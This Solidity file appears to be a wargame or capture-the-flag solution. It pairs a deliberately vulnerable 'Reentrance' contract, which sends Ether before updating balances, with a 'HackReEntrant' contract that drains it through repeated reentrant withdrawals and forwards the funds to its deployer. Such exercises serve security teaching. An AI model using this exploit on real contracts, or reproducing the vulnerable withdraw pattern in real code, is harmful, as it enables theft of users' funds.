// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../node_modules/@openzeppelin/contracts/math/SafeMath.sol";
//import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol";  /// @dev for remix

contract Reentrance {
  
	using SafeMath for uint256;
	mapping(address => uint) public balances;

	function donate(address _to) public payable {
    	balances[_to] = balances[_to].add(msg.value);
  	}

  	function balanceOf(address _who) public view returns (uint balance) {
    	return balances[_who];
  	}

  	function withdraw(uint _amount) public {
    	if(balances[msg.sender] >= _amount) {
      		(bool result,) = msg.sender.call{value:_amount}("");
      		if(result) {
        		_amount;
    	  	}
	    	balances[msg.sender] -= _amount;
    	}
  	}

  	receive() external payable {}
}

contract HackReEntrant {
    Reentrance public original;
    uint public amount;
	address payable actor;

    constructor(Reentrance _address) public {
		actor = msg.sender;
		original = _address;
    }

    function donateToSelf() public payable { 
		amount = msg.value;
        original.donate.value(amount).gas(1000000000000000)(address(this));
    }

    receive() external payable {
        if (address(original).balance != 0) {
            original.withdraw(amount);
        }
		else
		{
			withdrawFunds();
		}
    }

	function withdraw() public {
		if (address(original).balance != 0) {
            original.withdraw(amount);
        }
	}

	function withdrawFunds() public {
		actor.transfer(address(this).balance);
	}
}